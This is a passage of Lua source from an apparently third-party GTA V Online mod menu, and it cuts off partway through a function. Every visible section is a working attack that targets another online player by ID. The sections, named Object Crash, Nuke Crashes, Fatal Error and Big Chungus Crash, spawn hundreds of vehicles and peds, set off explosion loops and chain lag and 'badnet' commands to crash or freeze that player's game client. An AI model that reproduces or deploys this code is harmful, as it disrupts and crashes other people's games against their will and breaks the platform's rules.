        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coordss = coordss[math.random(1, #coordss)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coordss = coordss[math.random(1, #coordss)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coordss[1], let_coordss[2], let_coordss[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planess[math.random(1, #planess)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(5000)
        for i = 1, 50 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end)

players.on_join(function(pid)
    if G_GeneratedList then
        generatePlayerTeleports()
    end
    -- playerFuncs(pid)
end)


local objectc = menu.list(newcrash, "Object Crash", {}, "")

local amount = 200
local delay = 100
menu.slider(objectc, "Spawn Amount", {}, "", 0, 2500, amount, 50, function(val)
    amount = val
end)

menu.slider(objectc, "Spawn Delay", {}, "", 0, 500, delay, 10, function(val)
    delay = val
end)

menu.list_select(objectc, "Object Model", {}, "", object_names, 1, function(val)
    selectedobject = all_objects[val]
end)

menu.action(objectc, "Send Objects", {}, "", function()
    
    local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
    local myped = PLAYER.PLAYER_PED_ID()
    local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
    local objects = {}
    for i = 1, amount do
        if not players.exists(pid) then
            break
        end
        ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        ppos.x = ppos.x + math.random(-1, 1)
        ppos.y = ppos.y + math.random(-1, 1)
        objects[#objects+1] = CreateObject(selectedobject, ppos)
        FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
        util.yield(delay)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selectedobject)
    if players.exists(pid) then
        util.yield(2500)
    end
    ClearEntities(objects)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
    util.yield(50)
    local allobjs = entities.get_all_objects_as_handles()
    for i, object in ipairs(allobjs) do
        if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selectedobject then
            entities.delete_by_handle(object)
        end
    end
    util.yield(50)
    
    util.toast("[Object Crash] Finished.")
end)



local spawnDistance = 250
local vehicleType = { 'volatol', 'bombushka', 'jet', 'hydra', 'luxor2', 'seabreeze', 'tula', 'avenger2' }
local selected = 1
local antichashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
local spawnedPlanes = {}

local nukecrash = menu.list(newcrash, "Nuke Crashes", {}, "")
    
menu.slider(nukecrash, "Nuke Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    spawnDistance = distance
end)

menu.list_select(nukecrash, 'Nuke Mode', {}, "", vehicleType, 1, function (opt)
    selected = opt
    -- print('Opt: '..opt..' | vehicleType: '..vehicleType[selected])
end)

menu.action(nukecrash, "Nuke player", {}, "", function ()
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType[selected])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    menu.trigger_command(antichashCam, "on")
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Crash | Nuker started. Enabled antichash cam to prevent crash.")
    while util.current_time_millis() - startTime < 20000 do
        local pos = GetCoordsInFrontOfEntity(playerPed, spawnDistance)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end

    ClearEntities(spawnedPlanes)
    spawnedPlanes = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    menu.trigger_command(antichashCam, "off")
    util.toast("Crash | Nuker finished.")
end)


menu.toggle(newcrash, "Fatal Error", {"fatal"}, "WARNING: DO NOT SPECTATE!.", function(on)
	if on then
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
	menu.trigger_commands("panic")
	menu.trigger_commands("badnet" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("toggletppeds" .. players.get_name(pid))
                    util.yield(100)
    menu.trigger_commands("toggletpvehs" .. players.get_name(pid))
                    util.yield(100)
    menu.trigger_commands("toggletpobjs" .. players.get_name(pid))
                    util.yield(100)
    menu.trigger_commands("toggletppickups" .. players.get_name(pid))
                    util.yield(100)
	menu.trigger_commands("poodlev2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("togglefragv1" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("glitchphysics" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("rainpeds" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("rainveh" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("lagwitharmytrailer2" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("lagwithbarracks" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("lagwithbarracks3" .. players.get_name(pid))
                	util.yield(100)
    menu.trigger_commands("lagwithdune" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("laughter" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("seizurev3" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxclown" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
                	util.yield(100)
	menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
                	util.yield(100)
        	menu.trigger_commands("chaosyeet" .. players.get_name(pid))
        	menu.trigger_commands("blackholeoffset" .. players.get_name(pid) .. " 10")
else
        util.toast("Please hold whilst I recover your menu :)")
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
                	util.yield(1500)
	menu.trigger_commands("badnet" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("chaosyeet" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("toggletppeds" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("toggletpvehs" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("toggletpobjs" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("toggletppickups" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("poodlev2" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("togglefragv1" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("glitchphysics" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("rainpeds" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("rainveh" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("lagwitharmytrailer2" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("lagwithbarracks" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("lagwithbarracks3" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("lagwithdune" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("laughter" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("seizurev3" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("ptfxclown" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
    util.yield(1)
	menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
    util.yield(1)
    menu.trigger_commands("clean")
    menu.trigger_commands("superc")
    menu.trigger_commands("noentities")
	menu.trigger_commands("panic")
    util.yield(1000)
    menu.trigger_commands("noentities")
    util.toast("Fatal Error Crash Stopped & Cleaned...")
	        end
    end)


local chunguscrashes = menu.list(Removals_List, "Big Chungus Crashes", {}, "")

menu.action(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
    
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
    
            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
        util.yield(1000)
    end)

menu.toggle(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
if on_toggle then
    menu.trigger_commands("tploopon" .. players.get_name(pid))
    menu.trigger_commands("anticrashcamera On")
    menu.trigger_commands("invisibility On")
    menu.trigger_commands("levitate On")
    menu.trigger_commands("potatomode On")
    menu.trigger_commands("nosky On")
    menu.trigger_commands("reducedcollision On")
    menu.trigger_commands("nocollision On")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local mdl = util.joaat("A_C_Cat_01")
    local mdl2 = util.joaat("U_M_Y_Zombie_01")
    local mdl3 = util.joaat("A_F_M_ProlHost_01")
    local mdl4 = util.joaat("A_M_M_SouCent_01")
    local veh_mdl = util.joaat("insurgent2")
    local veh_mdl2 = util.joaat("brawler")
    util.request_model(veh_mdl)
    util.request_model(veh_mdl2)
    util.request_model(mdl)
    util.request_model(mdl2)
    util.request_model(mdl3)
    util.request_model(mdl4)
    for i = 1, 250 do
        local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
        local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
        local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
        local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        util.yield(100)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
        
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
    entities.delete_by_handle(mdl)
    entities.delete_by_handle(mdl2)
    entities.delete_by_handle(mdl3)
    entities.delete_by_handle(mdl4)
    entities.delete_by_handle(veh_mdl)
    entities.delete_by_handle(veh_mdl2)
    util.yield(1000)
else
    menu.trigger_commands("tploopon" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("anticrashcamera Off")
    menu.trigger_commands("tpmazehelipad")
    menu.trigger_commands("invisibility Off")
    menu.trigger_commands("levitate Off")
    menu.trigger_commands("potatomode Off")
    menu.trigger_commands("nosky Off")
    menu.trigger_commands("reducedcollision Off")
    menu.trigger_commands("nocollision Off")
    end
end)

menu.toggle_loop(newcrash, "Moab Crash", {"togglemoab"}, "WARNING! Toggle Panic Mode! DO NOT SPECTATE!.", function(on_toggle)
    if on_toggle then
